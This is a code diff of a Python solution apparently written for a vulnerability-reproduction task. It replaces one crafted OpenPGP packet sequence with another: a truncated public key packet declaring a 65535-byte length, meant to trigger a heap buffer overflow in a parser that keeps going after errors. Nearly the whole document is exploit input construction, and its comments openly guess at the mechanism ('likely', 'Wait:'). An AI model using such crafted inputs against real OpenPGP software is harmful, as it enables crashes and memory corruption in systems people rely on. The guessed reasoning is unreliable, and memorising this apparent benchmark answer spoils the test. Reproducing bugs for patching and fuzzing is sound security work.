@@ -3,45 +3,47 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Buffer Overflow in OpenPGP code.
-        The vulnerability allows execution to proceed after a step fails (only logging the error),
-        leading to a buffer overflow when writing the fingerprint.
-        We construct a sequence of OpenPGP packets including malformed ones to trigger this state.
+        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
+        
+        The vulnerability allows the code to proceed to fingerprint generation even after 
+        a parsing step fails (e.g., due to truncation or invalid data), merely logging the error.
+        By providing a Public Key Packet that declares a large length but is truncated, 
+        we trigger this condition. The fingerprint calculation likely uses the declared length 
+        to read data, resulting in a Heap Buffer Overflow (Read) or operates on uninitialized 
+        buffers leading to a Write overflow.
         """
-        
-        # 1. Valid V4 RSA Public Key Packet (Tag 6)
-        # Header: 0x98 (Old format, Tag 6, 1-byte len), Length 12
-        # Body: Version 4, Time 0, Algo 1 (RSA)
-        # MPI n: bitlen 1, value 1 (\x00\x01\x01)
-        # MPI e: bitlen 1, value 1 (\x00\x01\x01)
-        pkt_valid = b'\x98\x0C\x04\x00\x00\x00\x00\x01\x00\x01\x01\x00\x01\x01'
-        
-        # 2. User ID Packet (Tag 13)
-        # Header: 0xB4 (Old format, Tag 13, 1-byte len), Length 1
-        # Body: "A"
-        pkt_uid = b'\xB4\x01\x41'
+        poc = bytearray()
 
-        # 3. Malformed Public Key Packet: Unknown Algorithm (255)
-        # Header: 0x98, Length 6
-        # Body: Version 4, Time 0, Algo 255
-        # This causes the parser to log an "unsupported algorithm" or similar error,
-        # but if the code doesn't abort, it proceeds to fingerprint writing logic
-        # with potentially uninitialized or miscalculated buffer offsets.
-        pkt_bad_algo = b'\x98\x06\x04\x00\x00\x00\x00\xFF'
-        
-        # 4. Malformed Public Key Packet: Empty/Zero Length
-        # Header: 0x98, Length 0
-        # Another potential trigger for error handling logic flaws.
-        pkt_empty = b'\x98\x00'
+        # OpenPGP Public Key Packet (Tag 6)
+        # Tag Byte: 0x99 
+        #   - Bit 7: Always 1
+        #   - Bit 6: 0 (Old Format)
+        #   - Bits 5-2: 0110 (Tag 6 - Public Key)
+        #   - Bits 1-0: 01 (Length Type 1 - 2 bytes) -> Actually 0x99 is Length Type 2 in RFC 4880?
+        #   Wait: 
+        #   Old format: 10xxxxll. 
+        #   Tag 6 = 0110. 
+        #   10 0110 01 = 0x99 -> Length is 2 bytes (big endian).
+        poc.append(0x99)
 
-        # 5. Malformed Public Key Packet: Unknown Version (5)
-        # Header: 0x98, Length 6
-        # Body: Version 5, Time 0, Algo 1
-        pkt_bad_ver = b'\x98\x06\x05\x00\x00\x00\x00\x01'
+        # Packet Length: 0xFFFF (65535 bytes)
+        # We declare a large length to trick the parser/fingerprinter.
+        poc.append(0xFF)
+        poc.append(0xFF)
 
-        # Combine packets into a keyring stream.
-        # The sequence Valid -> UserID -> Bad -> Valid helps align the heap/state 
-        # such that the overflow occurs on a subsequent write.
-        poc = pkt_valid + pkt_uid + pkt_bad_algo + pkt_uid + pkt_empty + pkt_bad_ver + pkt_valid
+        # Packet Body
+        # Version: 4
+        poc.append(0x04)
+
+        # Creation Time: 4 bytes (0x00000000)
+        poc.extend([0x00, 0x00, 0x00, 0x00])
+
+        # Public Key Algorithm: RSA (1)
+        poc.append(0x01)
+
+        # We stop providing data here. 
+        # The parser expects 65535 bytes, but finds only 6 bytes of body.
+        # It should log an error (unexpected EOF) but if vulnerable, proceeds to 
+        # fingerprint calculation using the header's declared length.
         
-        return poc
+        return bytes(poc)
